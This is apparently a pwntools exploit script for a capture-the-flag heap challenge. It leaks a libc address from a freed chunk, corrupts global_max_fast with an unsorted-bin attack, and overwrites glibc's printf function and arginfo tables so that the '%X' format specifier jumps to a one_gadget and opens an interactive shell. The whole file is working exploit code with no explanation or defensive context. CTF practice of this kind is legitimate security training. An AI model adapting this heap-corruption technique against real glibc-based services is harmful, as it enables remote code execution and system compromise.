#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./pwn')

global_max_fast = 0x3ed940
__printf_arginfo_table = 0x3ec870
__printf_function_table = 0x3f0658
main_arena = 0x3ebc40

def wel():
  p.sendlineafter('your name:', '%X')

def add(idx, size):
  p.sendlineafter('Your choice:', str(1))
  p.sendlineafter('Index: ', str(idx))
  p.sendlineafter('Size:', str(size))

def delete(idx):
  p.sendlineafter('Your choice:', str(4))
  p.sendlineafter('Index: ', str(idx))

def show(idx):
  p.sendlineafter('Your choice:', str(3))
  p.sendlineafter('Index: ', str(idx)) 

def edit(idx, payload):
  p.sendlineafter('Your choice:', str(2))
  p.sendlineafter('Index: ', str(idx))
  p.sendlineafter('Content:', payload)

def offset2size(offset):
  return (offset) * 2 - 0x10

if __name__ == "__main__":
  # gdb.attach(p, 'b *$rebase(0xB0B)\n')
  wel()
  add(0, 0x500)
  add(1, offset2size(__printf_function_table - main_arena))
  add(2, offset2size(__printf_arginfo_table - main_arena))
  add(3, 0x500)

  delete(0)
  show(0)
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - main_arena - 0x60
  success('LIBC: ' + str(hex(libc)))
  og = [0x4f2c5, 0x4f322, 0x10a38c]
  payload = '\x00' * ((ord('X') - 2) * 8) + p64(libc + og[2])
  edit(2, payload)
  payload = p64(libc + main_arena + 0x60) + p64(libc + global_max_fast - 0x10)
  edit(0, payload)
  add(4, 0x500)

  delete(1)
  delete(2)

  # gdb.attach(p)
  p.sendlineafter('Your choice:', str(5))
  p.interactive()